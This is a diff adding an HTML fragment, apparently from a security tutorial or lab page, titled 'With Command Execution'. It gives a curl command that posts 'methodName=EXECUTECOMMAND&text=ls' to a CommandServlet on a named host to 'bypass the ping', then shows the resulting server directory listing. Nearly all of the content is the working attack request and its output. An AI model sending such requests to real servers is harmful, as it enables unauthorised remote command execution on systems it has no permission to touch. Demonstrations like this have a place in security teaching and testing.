@@ -1,0 +1,31 @@
+<hr>
+With Command Execution
+<hr>
+<pre class="brush: js;">
+	 
+	</pre>
+	<pre class="brush: js;">
+      //Execute this command to bypass the ping
+      curl 'http://zariga.com/CommandServlet'  --data 'methodName=EXECUTECOMMAND&text=ls' --compressed
+    </pre>
+    and the Output will be something like this
+    <pre class="brush: js;">
+    
+    <b><u>Command </b></u>= ls<br><font size="3" color="blue">COPYRIGHT<br>
+LICENSE<br>
+README.md<br>
+bin<br>
+conf<br>
+env<br>
+hooks<br>
+lib<br>
+metadata<br>
+run<br>
+template<br>
+tmp<br>
+usr<br>
+webapps<br>
+work<br>
+</font><br>
+
+</pre>
